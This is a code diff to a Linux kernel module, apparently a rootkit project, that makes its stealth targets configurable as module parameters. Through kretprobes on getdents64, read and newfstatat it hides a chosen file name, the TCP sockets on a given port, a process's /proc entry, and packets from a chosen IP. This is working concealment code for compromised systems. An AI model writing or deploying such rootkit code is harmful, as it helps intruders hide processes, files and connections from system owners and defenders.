@@ -22,11 +22,25 @@
 #include <linux/udp.h>
 #include <linux/if_arp.h>
 
-/// const file name to hide
-const char* hide_file_name = "hideme";
-const int port_to_hide = 8000;
-const char* pid_to_hide = "/proc/9704";
-const char selected_ip[4] = {192, 168, 1, 208};
+static char* hide_file_name = "FILE";
+module_param(hide_file_name, charp, S_IRWXU);
+MODULE_PARM_DESC(hide_file_name, "Hide any file that has the name.");
+
+static int port_to_hide = 8000;
+module_param(port_to_hide, int, S_IRWXU);
+MODULE_PARM_DESC(port_to_hide, "Hide all tcp sockets that is using this port.");
+
+static int pid_to_hide_n = 9704;
+module_param(pid_to_hide_n, int, S_IRWXU);
+MODULE_PARM_DESC(pid_to_hide_n, "Hide process with this PID.");
+
+static char* selected_ip_str = NULL;
+module_param(selected_ip_str, charp, S_IRWXU);
+MODULE_PARM_DESC(selected_ip_str, "ip to hide packets from.");
+
+static char selected_ip[4] = {0, 0, 0, 0};
+
+static char* pid_to_hide_path[256] = {0};
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -261,7 +275,7 @@ static int newfstatat_handle_return(struct kretprobe_instance *ri, struct pt_reg
     struct newfstatat_arguments* args = (struct newfstatat_arguments*) ri->data;
     unsigned long result = regs_return_value(regs);
 
-    if(strcmp(args->pathname, pid_to_hide) == 0){
+    if(strcmp(args->pathname, (const char *) pid_to_hide_path) == 0){
         pr_info("HIDE -> newfstatat(%s) = %ld\n", args->pathname, result);
         regs_set_return_value(regs, -1);
         return 0;
@@ -414,6 +428,19 @@ static struct kretprobe newfstatat_kret_probe = {
 
 static int __init entrypoint(void)
 {
+    if(selected_ip_str == NULL){
+        pr_err("Ip is not configured.\n");
+        return -EINVAL;
+    }
+
+    if(sscanf(selected_ip_str, "%hhd.%hhd.%hhd.%hhd", &(selected_ip[0]), &(selected_ip[1]),&(selected_ip[2]),&(selected_ip[3])) != 4){
+        pr_err("Invalid ip is configured %s.\n", selected_ip_str);
+        return -EINVAL;
+    }
+
+    sprintf((char *) pid_to_hide_path, "/proc/%d", pid_to_hide_n);
+
+
     if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0 || register_kretprobe(&newfstatat_kret_probe) < 0) {
         pr_info("register_kretprobe failed\n");
         return -1;
@@ -425,7 +452,7 @@ static int __init entrypoint(void)
     }
 
 
-    pr_info("kretprobe registered\n");
+    pr_info("yarin_module registered; hide_file_name='%s', hide_port=%d, hide_pid=%d, block_ip=%s\n", hide_file_name, port_to_hide, pid_to_hide_n, selected_ip_str);
     return 0;
 }
 
